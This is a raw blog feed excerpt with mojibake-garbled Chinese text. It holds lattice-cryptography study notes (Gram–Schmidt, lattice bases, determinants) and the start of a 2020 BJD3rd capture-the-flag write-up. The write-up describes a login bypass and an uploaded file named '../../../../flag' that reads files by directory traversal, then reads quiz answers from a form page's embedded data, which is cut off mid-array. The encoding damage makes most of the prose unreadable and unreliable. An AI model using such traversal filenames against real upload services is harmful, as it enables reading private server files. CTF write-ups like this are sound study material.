Spaces"></a>Vector Spaces</h4><p>åœ¨è®²æ ¼ä¹‹å‰ï¼Œæˆ‘ä»¬è¿™é‡Œå†å›å¿†ä¸€äº›çº¿ä»£ä¸­æ¯”è¾ƒé‡è¦çš„å®šä¹‰å’Œæƒ³æ³•ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬æ¥è¯´è¯´å‘é‡ç©ºé—´</p><p>å‘é‡ç©ºé—´å°±æ˜¯ç”±ä¸€ç³»åˆ—å‘é‡æ„æˆçš„ä¸€ä¸ªç©ºé—´å’¯ï¼Œ</p><p>nç»´å‘é‡ç©ºé—´çš„ä¸€ä¸ªåŸºå°±æ˜¯ç”±næ¡çº¿æ€§æ— å…³çš„å‘é‡æ„æˆçš„</p><p>è¿™ä¸ªåŸºé‡Œçš„næ¡çº¿æ€§æ— å…³çš„å‘é‡å¯ä»¥ç›¸äº’ä¹‹é—´çš„åŠ ã€å‡ï¼Œæˆ–è€…ä¸€æ¡å‘é‡è‡ªå·±ä¹˜ä»¥ä¸€ä¸ªç³»æ•°ï¼Œå¾—åˆ°çš„ç»“æœéƒ½åœ¨è¿™ä¸ªè¿™ä¸ªç©ºé—´é‡Œã€‚æˆ‘ä»¬ç§°ä¹‹ä¸ºï¼Œå‘é‡ç©ºé—´æ˜¯é—­åˆçš„ã€‚</p><h4 id="Linear-Combinations"><a href="#Linear-Combinations" class="headerlink" title="Linear Combinations"></a>Linear Combinations</h4><p>æ¢ä¸ªè¯´æ³•å°±æ˜¯ï¼Œä½ æ‰¾åˆ°næ¡çº¿æ€§æ— å…³çš„å‘é‡ï¼Œç„¶åæŠŠä»–ä»¬çº¿æ€§ç»„åˆ$w = a_1v_1+a_2v_2+\dots + a_kv_k$</p><p>å…¶ä¸­$a_i$ æ˜¯ä»»æ„çš„å®æ•°ï¼ŒæŠŠå¯ä»¥ç”Ÿæˆçš„æ‰€æœ‰çš„$w$ç»„åˆèµ·æ¥ä¸ºä¸€ä¸ªé›†åˆï¼Œæˆ‘ä»¬å°±ç§°ä¹‹ä¸º${v_1,â€¦,v_k}$çš„å‘é‡ç©ºé—´ã€‚</p><h4 id="Independence"><a href="#Independence" class="headerlink" title="Independence"></a>Independence</h4><p>è€Œæ‰€è°“çº¿æ€§æ— å…³å°±æ˜¯ï¼Œnæ¡çº¿æ€§æ— å…³çš„å‘é‡ï¼Œå…¶ä¸­ä»»ä½•ä¸€æ¡éƒ½ä¸èƒ½ç”±å‰©ä¸‹çš„å…¶ä»–å‘é‡æ¥è¡¨ç¤ºï¼Œ</p><p>å³å¼å­$a_1v_1+a_2v_2+â€¦+a_kv_k = 0$çš„è§£æœ‰ä¸”ä»…æœ‰ä¸€ä¸ªï¼Œå°±æ˜¯$a_1=a_2=â€¦=a_k=0$</p><p>ç„¶ååœ¨ç”±è¿™næ¡çº¿æ€§æ— å…³çš„å‘é‡æ‰€ç»„æˆçš„å‘é‡ç©ºé—´ä¸­çš„å…¶ä»–ä»»æ„å‘é‡ï¼Œéƒ½å¯ä»¥ç”±è¿™næ¡çº¿æ€§æ— å…³çš„å‘é‡æ¥è¡¨ç¤º</p><h4 id="Bases"><a href="#Bases" class="headerlink" title="Bases"></a>Bases</h4><p>æ˜¾ç„¶ä¸€ä¸ªå‘é‡ç©ºé—´ä¸åªæœ‰ä¸€ä¸ªåŸºï¼Œé‚£ä¹ˆå¦‚ä½•æ‰¾åˆ°å…¶ä»–çš„åŸºå‘¢ï¼Ÿ</p><p>è¿™é‡Œé¦–å…ˆæ‹¿åˆ°ä¸€ç»„åŸº$v_1,,,,v_n$ï¼Œç„¶ååˆ©ç”¨è¿™ä¸€ç»„å‘é‡å†ç”Ÿæˆå¦å¤–ä¸€ç»„å‘é‡ï¼Œè¡¨ç¤ºä¸º</p><p>$w_1 = a_{11}v_1+a_{12}v_2+â€¦+a_{1n}v_n$</p><p>$w_2 = a_{21}v_1+a_{22}v_2+â€¦+a_{2n}v_n$</p><p>$\vdots  $</p><p>$w_n = a_{n1}v_1+a_{n2}v_2+â€¦+a_{nn}v_n$</p><p>å½“çŸ©é˜µ$M =<br>\begin{bmatrix}<br>a_{11}&amp;a_{12}&amp;\dots&amp;a_{1n} \newline<br>a_{21}&amp;a_{22}&amp;\dots&amp;a_{2n} \newline<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \newline<br>a_{n1}&amp;a_{n2}&amp;\dots&amp;a_{nn} \newline<br>\end{bmatrix}$çš„è¡Œåˆ—å¼çš„å€¼ä¸ä¸º0</p><p>è¿™æ—¶ï¼Œ$(w_1,w_2,â€¦,w_n)$ä¹Ÿæ˜¯è¯¥å‘é‡ç©ºé—´çš„ä¸€ä¸ªåŸºäº†ã€‚</p><h4 id="length-or-Euclidean-norm"><a href="#length-or-Euclidean-norm" class="headerlink" title="length, or Euclidean norm"></a>length, or Euclidean norm</h4><p>å‘é‡$v$çš„æ¨¡é•¿ï¼Œä¹Ÿå«æ¬§å‡ é‡Œå¾—èŒƒæ•°ï¼Œä¸º</p><p>$||v|| = \sqrt{x_1^2+x_2^2+â€¦+x_m^2}$</p><h4 id="dot-product"><a href="#dot-product" class="headerlink" title="dot product"></a>dot product</h4><p>è®¾æœ‰å‘é‡$v=(x_1,x_2,â€¦,x_m),w=(y_1,y_2,â€¦,y_m)$</p><p>å‘é‡$w$å’Œ$v$çš„ç‚¹ç§¯ï¼Œå³ï¼š$v\cdot w = x_1y_1 + x_2y_2+â€¦+x_my_m$</p><p>å½“å®ƒä»¬çš„ç‚¹ç§¯ç»“æœä¸º0ï¼Œæˆ‘ä»¬ç§°$w$å’Œ$v$æ˜¯æ­£äº¤( orthogonal )çš„ã€‚</p><p>æ­¤æ—¶è¿™ä¸¤ä¸ªå‘é‡é—´çš„å¤¹è§’æ˜¯90Â°</p><p>å½“è¿™ä¸¤ä¸ªå‘é‡é—´çš„å¤¹è§’ä¸æ˜¯90Â°æ—¶ï¼Œæˆ‘ä»¬è®¾ä¹‹ä¸ºÎ¸</p><p>åˆ™$v\cdot w = ||v||||w||cos(Î¸)$</p><p>è¿™é‡Œæœ‰ä¸ªè‘—åçš„ä¸ç­‰å¼ï¼Œå³ä¸ºæŸ¯è¥¿ä¸ç­‰å¼ï¼ˆCauchyâ€“Schwarz inequalityï¼‰$|v\cdot w|â‰¤||v||||w||$</p><h4 id="orthogonal-basis"><a href="#orthogonal-basis" class="headerlink" title="orthogonal basis"></a>orthogonal basis</h4><p>å¦‚æœä¸€ä¸ªå‘é‡ç©ºé—´çš„ç§¯ä¸¤ä¸¤æ­£äº¤ï¼Œæˆ‘ä»¬ç§°è¿™ç»„åŸºä¸ºè¿™ä¸ªå‘é‡ç©ºé—´çš„orthogonal basis ä¿ºå«ä»–æ­£äº¤åŸºï¼Œå¦‚æœé‡Œå¤´çš„æ¯ä¸ªå‘é‡çš„æ¬§å‡ é‡Œå¾—èŒƒå¼éƒ½ä¸º1ï¼Œé‚£ä¹ˆå®ƒå°†å†æ¬¡è¿›åŒ–ï¼Œå¾—åˆ°ç§°å· orthonormal basisï¼Œä¿ºå«ä»–æ ‡å‡†æ­£äº¤åŸºã€‚</p><p>æ­£äº¤åŸºå¯ä»¥è®©ä¸€äº›äº‹æƒ…å˜å¾—ç®€å•ã€‚</p><p>æ¯”å¦‚ï¼Œæˆ‘ä»¬æœ‰ä¸€ç»„æ­£äº¤åŸº$v_1,v_2,â€¦,v_n$,è€Œ $v = a_1v_1+â€¦+a_nv_n$æ˜¯è¿™ç»„æ­£äº¤åŸº çš„æŸä¸ªçº¿æ€§ç»„åˆã€‚é‚£ä¹ˆæœ‰ï¼š</p><p>$||v||^2 = ||a_1v_1+..a_nv_n||^2 = (a_1v_1+â€¦+a_nv_n)\cdot(a_1v_1+â€¦+a_nv_n)$</p><p>$=\sum_\limits{i=1}^{n}\sum_\limits{j=1}^{n}a_ia_j(v_i\cdot v_j)$</p><p>$=\sum_\limits{i=1}^{n}a_i^2||v_i^2||$</p><p>å¦‚æœæ˜¯æ ‡å‡†æ­£äº¤åŸºï¼Œé‚£å°±ç›´æ¥$||v||^2 = \sum_\limits{i=1}^n a_i^2$å°±å¥½äº†</p><p>ç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªæ–¹æ³•ï¼Œå«åšGramâ€“Schmidt Algorithmï¼Œå¯ä»¥æ•´å‡ºä¸€ä¸ªæ­£äº¤åŸºæ¥ã€‚</p><h4 id="Gramâ€“Schmidt-Algorithm"><a href="#Gramâ€“Schmidt-Algorithm" class="headerlink" title="Gramâ€“Schmidt Algorithm"></a>Gramâ€“Schmidt Algorithm</h4><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ç»„åŸºï¼Œ$v_1,v_2,â€¦,v_n$ï¼Œç„¶åè®¾è¿™ä¸ªå‘é‡ç©ºé—´çš„æ­£äº¤åŸºä¸º$v^<em>_1,v^</em>_2,â€¦,v^*_n$</p><p>ä¸Šä¼ªä»£ç :</p><p>Set $v^*_1 = v_1$</p><p>Loop $i=2,3,â€¦,n$</p><p>&emsp;&emsp;Compute $Î¼_{ij} = \frac{v_i \cdot v^ * _j}{||v^ * _j||^2}$ for  $1â‰¤j&lt;i$</p><p>&emsp;&emsp;Set $v^ * _ i = v_ i - \sum_\limits{j=1}^{i-1}Î¼_ {ij}v^ * _ j$</p><p>End Loop</p><p>è¿™é‡Œçš„æ­£äº¤åŸºé‡Œå¤´çš„å‘é‡æˆ‘ä»¬æ˜¯ä¸€ä¸ªä¸€ä¸ªæ‰¾çš„ï¼Œæ¯æ‰¾åä¸€ä¸ªï¼Œéƒ½è¦ç”¨åˆ°å‰é¢å·²ç»æ‰¾å¥½çš„å±äºæ­£äº¤åŸºçš„å‘é‡ã€‚</p><p>ï¼ˆPSï¼šè¿™ä¸ªç®—æ³•æ˜¯ç”¨åœ¨LLLé‡Œå¤´çš„ï¼Œæœ‰å…³LLLçš„æ–‡ç« å¯ä»¥çœ‹è¿™ç¯‡<a href="https://kel.bz/post/lll/" target="_blank" rel="noopener">Building Lattice Reduction (LLL) Intuition</a>ï¼‰</p><h5 id="proof-1"><a href="#proof-1" class="headerlink" title="proof"></a>proof</h5><p>è¿™é‡Œè¯æ˜ä¸€ä¸‹$v_i^ *$ä¸å…¶ä»–å·²ç»æ‰¾åˆ°çš„ç›¸äº’æ­£äº¤çš„å‘é‡$v_1^ *,v_2^ *,,,v_{i-1}^ *$æ˜¯æ­£äº¤çš„ã€‚é‚£æˆ‘ä»¬å°±éšä¾¿è®¾ä¸€ä¸ªkï¼Œ$k&lt;i$ï¼Œ</p><p>è®¡ç®— $v^ * _ i\cdot v^ * _ k = (v _ i - \sum _ \limits{j=1}^{i-1}Î¼ _ {ij}v _ j^ * )\cdot v _ k^ * $  </p><p>$âˆµv_k^ *\cdot v_j^ *=0$ï¼ˆ å½“$jâ‰ k$ï¼‰</p><p>$âˆ´v^ * _ i\cdot v^ * _ k = (v _ i - \sum _ \limits{j=1}^{i-1}Î¼ _ {ij}v_j^ * )\cdot v _ k^ * =v _ i\cdot v _ k^ * -Î¼ _ {ik}||v _ k^ * ||^2 = v _ i\cdot v _ k^ * -v _ i\cdot v _ k^ * =0$</p><p>ï¼ˆPSï¼šæœ‰ç‚¹åƒæ•°å­¦å½’çº³æ³•å“ˆ~ï¼‰</p><h4 id="Lattices-Basic-deï¬nitions-and-properties"><a href="#Lattices-Basic-deï¬nitions-and-properties" class="headerlink" title="Lattices: Basic deï¬nitions and properties"></a>Lattices: Basic deï¬nitions and properties</h4><p>å¥½äº†ï¼Œç»ˆäºè¦å¼€å§‹æ­£å¼çš„latticeç›¸å…³çš„å†…å®¹äº†ã€‚</p><h5 id="lattice"><a href="#lattice" class="headerlink" title="lattice"></a>lattice</h5><p>å…¶å®æ ¼å¾ˆåƒå‘é‡ç©ºé—´</p><p>å‡è®¾æ ¼çš„ä¸€ç»„åŸº$v_1,,,,v_n$ï¼Œç„¶åæ ¼é‡Œè¿˜æœ‰å¦ä¸€ç»„å‘é‡$w_1,â€¦,w_n$ï¼Œå¯ä»¥è¡¨ç¤ºä¸º</p><p>$w_1 = a_{11}v_1+a_{12}v_2+â€¦+a_{1n}v_n$</p><p>$w_2 = a_{21}v_1+a_{22}v_2+â€¦+a_{2n}v_n$</p><p>$\vdots  $</p><p>$w_n = a_{n1}v_1+a_{n2}v_2+â€¦+a_{nn}v_n$</p><p>ç³»æ•°çŸ©é˜µ$A =<br>\begin{bmatrix}<br>a_{11}&amp;a_{12}&amp;\dots&amp;a_{1n}\newline<br>a_{21}&amp;a_{22}&amp;\dots&amp;a_{2n}\newline<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots\newline<br>a_{n1}&amp;a_{n2}&amp;\dots&amp;a_{nn}\newline<br>\end{bmatrix}$</p><p>å› ä¸ºæˆ‘ä»¬ç°åœ¨æ˜¯æ ¼ï¼Œæ‰€ä»¥è¿™ä¸ªçŸ©é˜µé‡Œçš„æ‰€æœ‰æ•°éƒ½æ˜¯æ•´æ•°ï¼Œä»è€Œæœ‰ï¼š</p><p>$1 = det(I) = det(AA^{-1})=det(A)det(A^{-1})$</p><p>å› ä¸º$det(A)$æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ‰$det(A)=\pm 1$</p><p>ç”±æ­¤å¯ä»¥å¾—å‡ºä¸€ä¸ªå¾ˆæœ‰è¶£çš„ç»“è®ºï¼šæ ¼çš„ä¸¤ç»„åŸºå¯ä»¥é€šè¿‡ä¸€ä¸ªè¡Œåˆ—å¼ä¸º1çš„çŸ©é˜µç›¸äº’è½¬æ¢ã€‚</p><h6 id="e-g"><a href="#e-g" class="headerlink" title="e.g."></a>e.g.</h6><p>æˆ‘ä»¬è€ƒè™‘ä¸€ä¸ªä¸‰ç»´æ ¼$L$ï¼Œç„¶åæˆ‘ä»¬æ‹¿åˆ°äº†ä¸‰ä¸ªå‘é‡</p><p>$v_1 = (2,1,3),v_2=(1,2,0),v_3=(2,-3,-5)$ä½œä¸ºçŸ©é˜µAçš„è¡Œå‘é‡ï¼Œ$A =<br>\begin{bmatrix}<br>2&amp;1&amp;3\newline<br>1&amp;2&amp;0\newline<br>2&amp;-3&amp;-5\newline<br>\end{bmatrix}$</p><p>ç„¶åæˆ‘ä»¬åˆ›å»ºå±äº$L$çš„ä¸‰ä¸ªæ–°çš„å‘é‡</p><p>$w_1=v_1+v_3,w_2=v_1-v_2+2v_3,w_3=v_1+2v_2$</p><p>è¿™ç›¸å½“äºå°†å·¦è¾¹çš„çŸ©é˜µAä¹˜ä»¥çŸ©é˜µ$U =<br>\begin{bmatrix}<br>1&amp;0&amp;1\newline<br>1&amp;-1&amp;2\newline<br>1&amp;2&amp;0\newline<br>\end{bmatrix}$,</p><p>ç„¶åæˆ‘ä»¬å°±å‘ç°$w_1,w_2,w_3$æ˜¯çŸ©é˜µ$B=UA=\begin{bmatrix}<br>4&amp;-2&amp;-2\newline<br>5&amp;-7&amp;-7\newline<br>4&amp;5&amp;3\newline<br>\end{bmatrix}$çš„è¡Œå‘é‡ã€‚</p><p>ç„¶ååˆå› ä¸º$det(U)=-1$ï¼Œæ‰€ä»¥å‘é‡$w_1,w_2,w_3$ä¹Ÿæ˜¯æ ¼$L$çš„åŸºï¼Œ</p><p>å¹¶ä¸”çŸ©é˜µ$U$çš„é€†çŸ©é˜µ$U^{-1}=\begin{bmatrix}<br>4&amp;-2&amp;-1\newline<br>-2&amp;1&amp;1\newline<br>-3&amp;2&amp;1\newline<br>\end{bmatrix}$çš„è¡Œå‘é‡è¯´æ˜äº†æ€ä¹ˆç”¨$w_i$æ¥è¡¨ç¤º$v_i$ï¼Œå³</p><p>$v_1=4w_1-2w_2-w_3,v_2=-2w_1+w_2+w_3,v_3=-3w_1+2w_2+w_3$</p><h5 id="discrete-additive-subgroup"><a href="#discrete-additive-subgroup" class="headerlink" title="discrete additive subgroup"></a>discrete additive subgroup</h5><p>æ ¼ä¹Ÿå¯ä»¥è¢«å®šä¹‰ä¸ºå¯åŠ ç¦»æ•£å­ç¾¤ï¼Œå› ä¸ºæ ¼ä¸­ä»»ä½•ä¸€ä¸ªæ ¼ç‚¹çš„å‘¨å›´éƒ½æ˜¯ç©ºæ—·çš„ï¼Œä¸æ˜¾å¾—å¾ˆç¦»æ•£ä¹ˆï¼Ÿ</p><p>è¿™é‡Œæœ‰ä¸€ä¸ªTheoremè¯´ï¼Œä¸€ä¸ªmç»´å‘é‡ç©ºé—´çš„å­é›†ï¼Œå½“ä¸”ä»…å½“å®ƒæ˜¯ä¸€ä¸ªç¦»æ•£å¯åŠ å­ç¾¤æ˜¯ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºæ ¼ã€‚</p><p>å…¶å®æ ¼ä¹Ÿæ˜¯æŸç§æ„ä¹‰ä¸Šçš„å‘é‡ç©ºé—´ï¼Œåªä¸è¿‡ä»–çš„ä¸€ä¸ªåŸºçš„ æ‰€æœ‰å‘é‡çš„ çº¿æ€§ç»„åˆçš„ ç³»æ•°éƒ½æ˜¯æ•´æ•°( all linear combinations of its basis vectors using integer coeï¬ƒcients)ã€‚æˆ‘ä»¬å¯ä»¥æŠŠæ ¼è§†ä¸ºåœ¨ä¸€ä¸ªç©ºé—´ä¸­ä¸€ç³»åˆ—æ’åºè§„åˆ™çš„ç‚¹é›†ã€‚</p><h5 id="fundamental-domain"><a href="#fundamental-domain" class="headerlink" title="fundamental domain"></a>fundamental domain</h5><p>è¿™é‡Œæˆ‘ä»¬åˆæœ‰ä¸€ä¸ªå®šä¹‰ï¼Œå«åšfundamental domainï¼Œæˆ‘ä»¬ç”¨å¼å­æ¥è¡¨ç¤ºè¿™ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯</p><p>$F(v_1,â€¦,v_n)={t_1v_1+t_2v_2+â€¦+t_nv_n:0â‰¤t_i&lt;1}$ï¼Œå°±æ˜¯ä¸‹å›¾ä¸­é˜´å½±éƒ¨åˆ†</p><p><img src="https://i.loli.net/2020/05/27/1kgTSXmBcqv2r4Q.png" alt></p><p>æ˜¾ç„¶ï¼Œè¿™äº›fundamental domainä¸æ­¢ä¸€å—ï¼Œå…¶ä»–çš„å—å¯ä»¥ç”±è¿™ä¸€å—å’Œæ ¼ä¸­çš„å‘é‡è¡¨ç¤ºä¸º</p><p>$F + v = {t+v:tâˆˆF}$</p><p><img src="https://i.loli.net/2020/05/27/VsBMWjxZd5fY26q.png" alt></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªfundamental domainçœ‹ä½œæ˜¯ç”±å‘é‡åŒ…å›´è€Œæˆçš„ä¸€ä¸ªå››è¾¹å½¢ã€‚åœ¨ç»™å®šå‘é‡çš„é•¿åº¦åï¼Œå½“å‘é‡é—´ç›¸äº’æ­£äº¤ï¼Œæ­¤æ—¶è¿™ä¸ªfundamental domainçš„é¢ç§¯è¾¾åˆ°æœ€å¤§ã€‚</p><p>è¿™å¼•å‡ºäº†ä¸‹é¢ä¸€ä¸ªå…³äºæ ¼çš„è¡Œåˆ—å¼çš„ä¸Šç•Œçš„ç†è®ºã€‚</p><h5 id="Hadamardâ€™s-Inequality"><a href="#Hadamardâ€™s-Inequality" class="headerlink" title="Hadamardâ€™s Inequality"></a>Hadamardâ€™s Inequality</h5><p>è®¾$L$æ˜¯ä¸€ä¸ªæ ¼ï¼Œå…¶ä¸€ç»„åŸºä¸º$v_1,v_2,â€¦,v_n$ï¼Œè®¾$F$ä¸º$L$çš„ä¸€ä¸ªfundamental domain,é‚£ä¹ˆæœ‰</p><p>$det(L)=Vol(F)â‰¤||v_1||||v_2||\dots ||v_n||$</p><p>å½“è¿™ä¸€ç»„åŸºè¶‹äºç›¸äº’æ­£äº¤æ—¶ï¼Œä¸ç­‰å¼ä¸¤è¾¹çš„å€¼è¶‹äºä¸€è‡´ï¼Œ$Vol$å¯ä»¥çœ‹ä½œæ˜¯Fçš„é•¿åº¦ï¼Œé¢ç§¯ï¼Œä½“ç§¯ç­‰åº¦é‡ï¼Œéšç»´åº¦çš„å˜åŒ–å…¶æœ‰ä¸åŒçš„å«ä¹‰ã€‚</p><p>è¿™ä¼¼ä¹è¿˜ç»™å‡ºäº†ä¸€ä¸ªè®¡ç®—æ ¼$L$è¡Œåˆ—å¼çš„ç®€å•æ–¹æ³•ã€‚ï¼ˆå…·ä½“è®¡ç®—ç»†èŠ‚æ¶‰åŠåˆ°å¤šå˜é‡å¾®ç§¯åˆ†ï¼Œæ˜¯é«˜æ•°ï¼Œawslï¼‰</p><p>å³$|det(F(v_1,v_2,â€¦,v_n))| = Vol(F(v_1,â€¦,v_n))=det(L)$</p><p>è¿™é‡Œçš„$v_i$ä¸æ˜¯æ ¼$L$çš„å‘é‡$v_i$ï¼Œæ˜¯${F(v_1,â€¦,v_n)={t_1v_1+t_2v_2+â€¦+t_nv_n:0â‰¤t_i&lt;1}}$é‡Œçš„$v_i$</p><h6 id="e-g-1"><a href="#e-g-1" class="headerlink" title="e.g."></a>e.g.</h6><p>$det(L) = |det (A)|=|-36|=36$ï¼Œè¿™é‡Œçš„Aå°±ä¸Šé¢é‚£ä¸ªe.g.ä¸­çš„é‚£ä¸ª$A =<br>\begin{bmatrix}<br>2&amp;1&amp;3\newline<br>1&amp;2&amp;0\newline<br>2&amp;-3&amp;-5\newline<br>\end{bmatrix}$</p><h5 id="det-L-is-an-invariant"><a href="#det-L-is-an-invariant" class="headerlink" title="det(L) is an invariant"></a>det(L) is an invariant</h5><p>å¯¹äºç»™å®šçš„ä¸€ä¸ªLï¼Œå›¾ä¹‹å‰çš„å›¾ä¸Šæ¥çœ‹ï¼Œæ˜¾ç„¶$Vol(F)$æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥$det(L)$ä¹Ÿæ˜¯ä¸€ä¸ªå®šå€¼</p><h6 id="proof-2"><a href="#proof-2" class="headerlink" title="proof"></a>proof</h6><p>æˆ‘ä»¬è®¾$L$çš„ä¸¤ä¸ª fundamental domains $v_1,v_2,â€¦,v_n ;w_1,w_2,â€¦,w_n$ ï¼ˆè¿™é‡Œçš„å‘é‡$v_i$ä¹Ÿä¸æ˜¯æ ¼$L$é‡Œçš„å‘é‡ï¼‰</p><p>ç„¶åæˆ‘ä»¬æœ‰$F(v_1,â€¦,v_n) = AF(w_1,â€¦,w_n)$ ã€è¿™ä¸ªå®šä¹‰åœ¨è¿™ä¸€ç« çš„æœ€å‰é¢ï¼Œç±»æ¯”æ ¼çš„ä¸¤ç»„åŸºå¯ä»¥é€šè¿‡ä¸€ä¸ªè¡Œåˆ—å¼ä¸º1çš„çŸ©é˜µç›¸äº’è½¬æ¢ã€‘</p><p>æ‰€æœ‰æˆ‘ä»¬æœ‰ï¼š</p><p>$Vol(F(v_1,â€¦,v_n))$</p><p>$=|det(F(v_1,â€¦,v_n))|$</p><p>$=|det(AF(w_1,â€¦,w_n))|$</p><p>$âˆµdet(AB)=det(A)det(B)$</p><p>$=|det(A)||det(F(w_1,â€¦,w_n))|    $        </p><p>$âˆµdet(A)=\pm1$</p><p>$=|det(F(w_1,â€¦,w_n))|$</p><p>$=|Vol(F(w_1,â€¦,w_n))|$</p><h3 id="Short-vectors-in-lattices"><a href="#Short-vectors-in-lattices" class="headerlink" title="Short vectors in lattices"></a>Short vectors in lattices</h3><p>ç³»ç»Ÿä¸­æ–­ï¼Œè¿™è¾¹è¦å’•å’•å’•ä¸€ä¼šå„¿äº†ã€‚ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> Basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 BJD3rd</title>
      <link href="/2020/05/26/2020BJD3rd/"/>
      <url>/2020/05/26/2020BJD3rd/</url>
      
        <content type="html"><![CDATA[<p>æ–‡ç« é¦–å‘äº<a href="https://www.anquanke.com/post/id/206493" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="gob"><a href="#gob" class="headerlink" title="gob"></a>gob</h3><p>ç™»å½•ä¸‡èƒ½å¯†ç ç™»ï¼ˆå¥½åƒå¯ä»¥ç›´æ¥éšä¾¿è¾“ï¼Ÿï¼‰ç„¶åæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢<img src="https://i.loli.net/2020/05/23/RfcozNwBxLAv3Gq.png" alt></p><p>ä¸Šä¼ åæ˜“å¾—ä¸€ä¸ªäºŒçº§ç›®å½•uploadsï¼Œç„¶åçœ‹äº†çœ‹ç›®å½•é‡Œéƒ½æ˜¯å„ç§é©¬ï¼Œä½†æ˜¯å› ä¸ºä¸è§£ææ‰€ä»¥ä¸€ä¸ªéƒ½æ²¡ç”¨ã€‚ã€‚ã€‚</p><p>ä½†æ˜¯æ­¤æ—¶å‘ç°æ–‡ä»¶ä¸Šä¼ åæ–‡ä»¶åå¹¶æ²¡æœ‰è¢«æ›´æ”¹ï¼Œæ‰€ä»¥æ¨æµ‹show.phpæ–‡ä»¶åŒ…å«ä¹Ÿæ˜¯ç›´æ¥åŒ…å«çš„æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ª<code>../../../../flag</code>æ–‡ä»¶è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå†è®¿é—®å°±å¯ä»¥å¾—åˆ°flagçš„base64ï¼Œè§£å¯†å³ä¸ºflagï¼ˆPS:å¿…é¡»å¾—åœ¨åŒä¸€ä¸ªsessionä¸­ï¼‰</p><p><img src="https://i.loli.net/2020/05/23/VG3YlUBnEWo9bJ4.png" alt></p><p><img src="https://i.loli.net/2020/05/23/kmSYPdNV4g6qeHM.png" alt></p><p><img src="https://i.loli.net/2020/05/23/vlax6wsF7CgcAVR.png" alt></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h3><p>F12è·å¾—flagï¼Œæ ‡å‡†ç­¾åˆ°é¢˜</p><p><img src="https://i.loli.net/2020/05/23/SOJZixI9wepd6Ns.png" alt></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">416</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">603160739</span>,<span class="string">"What is the name of the store?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">539054317</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Haolinju|haolinju"</span>]</span><br><span class="line">,<span class="string">"8cd9"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q"</span>,<span class="literal">null</span>,[<span class="number">740</span>,<span class="number">416</span>,<span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">488094967</span>,<span class="string">" What BRAND is this food?"</span>,<span class="literal">null</span>,<span class="number">0</span>,[[<span class="number">1465781074</span>,<span class="literal">null</span>,<span class="number">0</span>,<span class="literal">null</span>,[[<span class="number">4</span>,<span class="number">302</span>,[<span class="string">"Daoxiangcun|daoxiangcun"</span>]</span><br><span class="line">,<span class="string">"8f00b2"</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,[[<span class="string">"1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw"</span>,<span class="literal">null</span>,[<span class="number">375</span>,<span class="number">458</span>,<span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">]</span><br><span class="line">,[<span class="number">1097246628</span>,<span class="string">"Which RESTAURANT are the ducks coming from? "</span>,<span class="literal">null</span>,<span 